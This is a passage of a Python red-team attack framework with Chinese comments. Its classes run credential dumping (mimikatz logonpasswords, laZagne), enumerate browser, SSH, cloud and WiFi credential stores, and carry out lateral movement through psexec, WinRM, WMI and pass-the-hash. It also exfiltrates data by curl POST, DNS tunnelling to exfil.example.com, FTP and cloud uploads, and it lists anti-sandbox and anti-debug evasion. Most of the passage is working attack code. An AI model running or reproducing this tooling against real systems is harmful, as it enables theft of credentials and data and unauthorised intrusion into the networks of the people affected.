            {"name": "AES-256-GCM", "usage": "payload 加密落地 / 内存解密"},
            {"name": "XOR single-byte", "usage": "shellcode 简单混淆"},
            {"name": "RC4", "usage": "历史 C2 流量加密"},
        ]}

    def anti_sandbox_debug(self) -> Dict[str, Any]:
        return {"tech": "T1497 虚机/沙箱规避 / T1622 调试规避",
                "anti_sandbox": [
                    "延迟执行 (Sleep / 长 loop)",
                    "硬件检测 (CPU cores < 2 / RAM < 4GB)",
                    "磁盘大小 < 60GB",
                    "用户交互检测 (鼠标移动/文件对话框)",
                    "进程白名单 (分析工具进程名匹配)",
                ],
                "anti_debug": [
                    "IsDebuggerPresent()",
                    "CheckRemoteDebuggerPresent()",
                    "NtQueryInformationProcess(ProcessDebugPort)",
                    "硬件断点检测 (Dr0-Dr3)",
                    "时间差检测 (rdtsc)",
                ]}

    def tool_status(self) -> Dict[str, Any]:
        return {"powershell": probe("powershell"),
                "donut": probe("donut"),
                "syswhispers": "source-only (compile required)"}


# =========================================================================== #
# 6. 凭证访问
# =========================================================================== #
class RedCredentialAccess:
    """真实凭证访问（本地真实读取已存在的凭证文件）。"""

    def mimikatz(self, action: str = "sekurlsa::logonpasswords") -> Dict[str, Any]:
        p = probe("mimikatz.exe")
        if not p["available"]:
            return {"tech": "T1003 凭证转储", "tool": "mimikatz", "available": False,
                    "install_hint": ("下载 mimikatz (GitHub gentilkiwi)，需管理员/调试权限："
                                     "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit；"
                                     "LSASS 运行时转储常被 EDR 拦截，需先做防御规避")}
        r = run_command([p["path"], action, "exit"], timeout=120)
        hits = _findings_from_output(r["stdout"], ("username", "ntlm", "password", "domain"))
        return {"tech": "T1003.001 LSASS", "available": True, "action": action,
                "rc": r["rc"], "cred_hits": hits[:30], "error": r["error"] or r["stderr"][:300]}

    def lazagne(self) -> Dict[str, Any]:
        p = probe("laZagne.exe") or probe("laZagne")
        if not p["available"]:
            return {"tech": "T1003.004 应用屏存凭证", "tool": "laZagne", "available": False,
                    "install_hint": ("pip install laZagne  或 下载 laZagne.exe；"
                                     "运行: laZagne all 提取浏览器/邮件/WiFi/数据库凭证")}
        r = run_command([p["path"], "all"], timeout=180)
        hits = _findings_from_output(r["stdout"], ("password", "url", "username"))
        return {"tech": "T1003.004", "available": True, "cred_hits": hits[:40],
                "rc": r["rc"], "error": r["error"] or r["stderr"][:300]}

    def browser_creds(self) -> Dict[str, Any]:
        """真实定位浏览器 SQLite/登录数据文件（不自动解密 DPAPI，仅枚举存在性）。"""
        home = os.path.expanduser("~")
        candidates = {
            "chrome": os.path.join(home, "AppData", "Local", "Google", "Chrome",
                                   "User Data", "Default", "Login Data"),
            "edge": os.path.join(home, "AppData", "Local", "Microsoft", "Edge",
                                 "User Data", "Default", "Login Data"),
            "firefox": os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox",
                                    "Profiles"),
        }
        found = {}
        for k, v in candidates.items():
            if os.path.exists(v):
                found[k] = v if os.path.isfile(v) else glob.glob(os.path.join(v, "*"))
        return {"tech": "T1555.003 浏览器凭证", "available": bool(found),
                "databases_found": found,
                "install_hint": ("解密 Chrome/Edge Login Data 需 DPAPI (CryptUnprotectData) "
                                 "+ SQLite；可用 laZagne/SharpChrome 自动完成")}

    def windows_vault(self) -> Dict[str, Any]:
        vault = os.path.join(os.path.expanduser("~"),
                             "AppData", "Local", "Microsoft", "Vault")
        exists = os.path.isdir(vault)
        return {"tech": "T1555.004 Windows 凭证管理器",
                "vault_path": vault, "exists": exists,
                "install_hint": "vaultcmd /listcreds:\"Windows Credentials\" /all；"
                               "或 mimikatz vault::cred"}

    def wifi_passwords(self) -> Dict[str, Any]:
        """真实执行 netsh 枚举 WiFi 配置名（只读）。"""
        p = probe("netsh")
        if not p["available"]:
            return {"tech": "T1040 网络凭证 / T1552.001", "available": False,
                    "install_hint": "Windows 自带 netsh.exe"}
        r = run_command(["netsh", "wlan", "show", "profiles"], timeout=30)
        profiles = [ln.split(":")[1].strip() for ln in (r["stdout"] or "").splitlines()
                    if "All User Profile" in ln or "所有用户配置文件" in ln]
        return {"tech": "T1040", "available": True,
                "profile_count": len(profiles), "profiles": profiles,
                "decrypt_cmd_template": "netsh wlan show profile name=\"<ssid>\" key=clear",
                "error": r["error"] or r["stderr"][:300]}

    def ssh_keys(self) -> Dict[str, Any]:
        ssh_dir = os.path.join(os.path.expanduser("~"), ".ssh")
        found = {}
        if os.path.isdir(ssh_dir):
            for fn in ("id_rsa", "id_ed25519", "id_ecdsa", "known_hosts", "authorized_keys", "config"):
                fp = os.path.join(ssh_dir, fn)
                if os.path.exists(fp):
                    found[fn] = {"path": fp, "size": os.path.getsize(fp)}
        return {"tech": "T1552.001 未加密密钥", "ssh_dir": ssh_dir,
                "found_keys": found, "available": bool(found),
                "install_hint": "私钥若无 passphrase 即可直接 SSH 横向"}

    def cloud_creds(self) -> Dict[str, Any]:
        home = os.path.expanduser("~")
        paths = {
            "aws": os.path.join(home, ".aws", "credentials"),
            "azure": os.path.join(home, ".azure", "accessTokens.json"),
            "gcp": os.path.join(home, ".config", "gcloud", "credentials.db"),
            "aliyun": os.path.join(home, ".aliyun", "config.json"),
        }
        found = {k: v for k, v in paths.items() if os.path.exists(v)}
        return {"tech": "T1552.005 云凭证", "found": found,
                "available": bool(found),
                "install_hint": "AWS: aws sts get-caller-identity 验证；"
                               "泄露 AccessKey 即可横向云资源"}

    def tool_status(self) -> Dict[str, Any]:
        return {"mimikatz": probe("mimikatz.exe"), "lazagne": probe("laZagne.exe"),
                "netsh": probe("netsh"), "vaultcmd": probe("vaultcmd")}


# =========================================================================== #
# 7. 横向移动
# =========================================================================== #
class RedLateral:
    """真实横向。"""

    def smb_lateral(self, target: str, user: str, password: str = "",
                    command: str = "whoami") -> Dict[str, Any]:
        tools = [probe("psexec"), probe("psexec64"), probe("wmiexec")]
        t = next((x for x in tools if x["available"]), None)
        if not t:
            return {"tech": "T1021.002 SMB/Windows Admin Shares",
                    "available": False, "target": target,
                    "install_hint": ("Impacket 工具集: impacket-psexec / impacket-wmiexec "
                                     "(pip install impacket)；或 Sysinternals PsExec.exe")}
        cmd = [t["path"], f"{user}:{password or ''}@{target}", command]
        r = run_command(cmd, timeout=120)
        return {"tech": "T1021.002", "available": True, "tool": t["tool"],
                "target": target, "rc": r["rc"], "stdout": r["stdout"][:2000],
                "error": r["error"] or r["stderr"][:300]}

    def winrm_lateral(self, target: str, user: str, password: str = ""
                      ) -> Dict[str, Any]:
        p = probe("evil-winrm")
        if not p["available"]:
            return {"tech": "T1021.006 WinRM", "available": False, "target": target,
                    "install_hint": "gem install evil-winrm；或 impacket-wmiexec；"
                                   "需目标 5985/5986 开放"}
        r = run_command([p["path"], "-u", user, "-p", password, "-h", target,
                        "-e", "/home/"], timeout=60)
        return {"tech": "T1021.006", "available": True, "rc": r["rc"],
                "stdout": r["stdout"][:2000], "error": r["error"] or r["stderr"][:300]}

    def ssh_lateral(self, target: str, user: str, key_path: str = "") -> Dict[str, Any]:
        p = probe("ssh")
        if not p["available"]:
            return {"tech": "T1021.004 SSH", "available": False, "target": target,
                    "install_hint": "Windows: 启用 OpenSSH 客户端（设置-可选功能）；"
                                   "Linux: apt install openssh-client"}
        cmd = [p["path"]] + (["-i", key_path] if key_path else []) + \
              ["-o", "StrictHostKeyChecking=no",
               f"{user}@{target}", "whoami && hostname"]
        r = run_command(cmd, timeout=60)
        return {"tech": "T1021.004", "available": True, "rc": r["rc"],
                "stdout": r["stdout"][:1500], "error": r["error"] or r["stderr"][:300]}

    def rdp_lateral(self, target: str) -> Dict[str, Any]:
        p = probe("xfreerdp") or probe("mstsc")
        return {"tech": "T1021.001 RDP", "tool": p["tool"], "available": bool(p["available"]),
                "target": target,
                "cmd": (f"{p['path']} /v:{target} /u:<user> /pth:<ntlm>"
                        if p["available"] else None),
                "install_hint": "Linux: apt install freerdp2-x11；Windows mstsc.exe 自带"}

    def wmi_lateral(self, target: str, user: str, password: str = "",
                    command: str = "whoami") -> Dict[str, Any]:
        p = probe("wmic") or probe("impacket-wmiexec")
        if not p["available"]:
            return {"tech": "T1047 WMI", "available": False, "target": target,
                    "install_hint": "impacket-wmiexec DOMAIN/user:pass@target 'cmd'；"
                                   "Windows: wmic /node:target process call create"}
        cmd = [p["path"], f"/node:{target}", "process", "call", "create",
               f'"cmd /c {command}"']
        r = run_command(cmd, timeout=60)
        return {"tech": "T1047", "available": True, "rc": r["rc"],
                "stdout": r["stdout"][:1500], "error": r["error"] or r["stderr"][:300]}

    def dcom_lateral(self) -> Dict[str, Any]:
        return {"tech": "T1021.003 DCOM", "dcom_objects": [
            {"app": "MMC20.Application", "clsid": "49B2791A-B1AE-4C90-9B8E-E860BA07F889",
             "cmd": "Document.ActiveView.ExecuteShellCommand"},
            {"app": "Excel DDE / Office", "clsid": "00024500-0000-0000-C000-000000000046"},
            {"app": "ShellBrowserWindow", "clsid": "9BA05972-F6A8-11CF-A442-00A0C90A8F39"},
        ],
        "note": "通过 dcom Launch.ExecCommand 远程执行，不依赖 WinRM/SMB 服务"}

    def pass_the_hash(self, target: str, user: str, nt_hash: str,
                      domain: str = "") -> Dict[str, Any]:
        p = probe("impacket-wmiexec") or probe("psexec")
        if not p["available"]:
            return {"tech": "T1550.002 Pass-the-Hash", "available": False,
                    "install_hint": "impacket-wmiexec -hashes :<ntlm> "
                                   "DOMAIN/user@target 'cmd'；pip install impacket"}
        cmd = [p["path"], f"-hashes", f":{nt_hash}",
               f"{domain or '.'}/{user}@{target}", "whoami"]
        r = run_command(cmd, timeout=90)
        return {"tech": "T1550.002", "available": True, "target": target,
                "rc": r["rc"], "stdout": r["stdout"][:1500],
                "error": r["error"] or r["stderr"][:300]}

    def overpass_hash(self, target: str, user: str, nt_hash: str) -> Dict[str, Any]:
        return {"tech": "T1550.004 Overpass-the-Hash", "available": False,
                "tool": "Rubeus / mimikatz",
                "install_hint": ("Rubeus.exe asktgt /user:u /rc4:<ntlm> /opsec /nowrap；"
                                 "mimikatz sekurlsa::pth /user /domain /ntlm；"
                                 "用 NTLM 请求 Kerberos TGT")}

    def tool_status(self) -> Dict[str, Any]:
        return {"psexec": probe("psexec"), "wmiexec": probe("wmiexec"),
                "evil_winrm": probe("evil-winrm"), "ssh": probe("ssh"),
                "xfreerdp": probe("xfreerdp"), "wmic": probe("wmic"),
                "impacket": probe("impacket-wmiexec")}


# =========================================================================== #
# 8. 数据外泄
# =========================================================================== #
class RedExfiltration:
    """真实数据外泄。"""

    def compress(self, src: str, archive: str = "", password: str = "") -> Dict[str, Any]:
        tools = [probe("7z"), probe("7z.exe"), probe("rar"), probe("winrar")]
        t = next((x for x in tools if x["available"]), None)
        if not t:
            return {"tech": "T1560 归档数据", "available": False,
                    "install_hint": ("Windows: 安装 7-Zip 加入 PATH；"
                                     "Linux: apt install p7zip-full；"
                                     "Python 可用 shutil.make_archive 兜底")}
        archive = archive or os.path.join(GEN_DIR, f"exfil_{int(time.time())}.7z")
        cmd = [t["path"], "a"] + (["-p" + password] if password else []) + [archive, src]
        r = run_command(cmd, timeout=180)
        return {"tech": "T1560.001", "available": True, "tool": t["tool"],
                "archive": archive if os.path.exists(archive) else "",
                "exists": os.path.exists(archive), "rc": r["rc"],
                "error": r["error"] or r["stderr"][:300]}

    def exfil_http(self, file_path: str, url: str) -> Dict[str, Any]:
        if not os.path.exists(file_path):
            return {"tech": "T1041 外泄 over C2", "sent": False,
                    "error": f"文件不存在: {file_path}",
                    "install_hint": "提供待外泄文件路径与接收 URL"}
        p = probe("curl")
        if not p["available"]:
            return {"tech": "T1041", "available": False,
                    "install_hint": "Windows 10+ 自带 curl.exe；否则下载 cURL"}
        r = run_command([p["path"], "-s", "-X", "POST",
                        "-F", f"file=@{file_path}", url], timeout=120)
        return {"tech": "T1041 / T1567", "available": True, "url": url,
                "rc": r["rc"], "stdout": r["stdout"][:800],
                "error": r["error"] or r["stderr"][:300]}

    def exfil_dns(self, data: str, dns_server: str = "8.8.8.8") -> Dict[str, Any]:
        p = probe("dig") or probe("nslookup")
        if not p["available"]:
            return {"tech": "T1048.003 替代协议外泄", "available": False,
                    "install_hint": "Linux: apt install dnsutils；Windows 自带 nslookup"}
        chunk = data[:30]
        sub = chunk.encode().hex()
        r = run_command([p["path"], f"{sub}.exfil.example.com",
                        f"@{dns_server}", "TXT"], timeout=30)
        return {"tech": "T1048.003 DNS 隧道", "available": True,
                "encoded_chunk": sub, "rc": r["rc"],
                "note": "真实 DNS TXT 查询外泄需自建权威 DNS；此处演示编码分块",
                "error": r["error"] or r["stderr"][:200]}

    def exfil_ftp(self, file_path: str, ftp_url: str) -> Dict[str, Any]:
        p = probe("curl")
        if not p["available"]:
            return {"tech": "T1048.003 FTP", "available": False,
                    "install_hint": "curl 支持 ftp:// 上传"}
        r = run_command([p["path"], "-T", file_path, ftp_url], timeout=120)
        return {"tech": "T1048.003", "available": True, "rc": r["rc"],
                "error": r["error"] or r["stderr"][:300]}

    def exfil_cloud(self) -> Dict[str, Any]:
        return {"tech": "T1567.002 云存储外泄", "destinations": [
            {"name": "AWS S3", "cmd": "aws s3 cp ./data.zip s3://bucket/ --acl public-read"},
            {"name": "阿里云 OSS", "cmd": "ossutil cp data.zip oss://bucket/"},
            {"name": "OneDrive", "cmd": "rclone copy data.zip remote:onedrive/"},
            {"name": "Google Drive", "cmd": "gdrive upload data.zip"},
        ],
        "install_hint": "rclone config 配置远端；需目标云凭证"}

    def exfil_catalog(self) -> Dict[str, Any]:
        return {"tech": "TA0010 数据外泄", "channels": [
            {"id": "T1560.001", "name": "本地归档压缩"},
            {"id": "T1041", "name": "C2 通道 HTTP/HTTPS POST"},
            {"id": "T1048.003", "name": "DNS/ FTP / ICMP 替代协议"},
            {"id": "T1567.002", "name": "云存储上传"},
            {"id": "T1114.001", "name": "邮件自动转发"},
        ]}

    def tool_status(self) -> Dict[str, Any]:
        return {"seven_zip": probe("7z"), "curl": probe("curl"),
                "dig": probe("dig"), "aws": probe("aws"),
                "rclone": probe("rclone"), "ossutil": probe("ossutil")}


# --------------------------------------------------------------------------- #
class RedAttackChain:
    """红队八大战术聚合门面。"""

    def __init__(self) -> None:
        self.initial_access = RedInitialAccess()
        self.execution = RedExecution()
        self.persistence = RedPersistence()
        self.privesc = RedPrivEsc()
        self.defense_evasion = RedDefenseEvasion()
        self.credential_access = RedCredentialAccess()
        self.lateral = RedLateral()
        self.exfiltration = RedExfiltration()

    TACTICS = [
        ("initial_access", "初始访问"), ("execution", "执行"),
        ("persistence", "持久化"), ("privilege_escalation", "提权"),
        ("defense_evasion", "防御规避"), ("credential_access", "凭证访问"),
        ("lateral_movement", "横向移动"), ("exfiltration", "数据外泄"),
    ]

    def full_tool_matrix(self) -> Dict[str, Any]:
        return {
            "initial_access": self.initial_access.tool_status(),
            "execution": self.execution.tool_status(),
            "persistence": self.persistence.tool_status(),
            "privesc": self.privesc.tool_status(),
            "defense_evasion": self.defense_evasion.tool_status(),
            "credential_access": self.credential_access.tool_status(),
            "lateral": self.lateral.tool_status(),
            "exfiltration": self.exfiltration.tool_status(),
        }


_default: Optional[RedAttackChain] = None


def get_red_attack_chain() -> RedAttackChain:
    global _default
    if _default is None:
        _default = RedAttackChain()
    return _default
